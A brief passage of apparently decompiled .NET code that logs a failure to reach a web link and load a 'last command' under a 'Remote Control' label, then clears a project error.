        EventLogger.LogEvent("Weblink unreachable! Unable to load last command. lastcommand = 'NULL'", "Remote Control");
        ProjectData.ClearProjectError();
      }
    }
  }
}
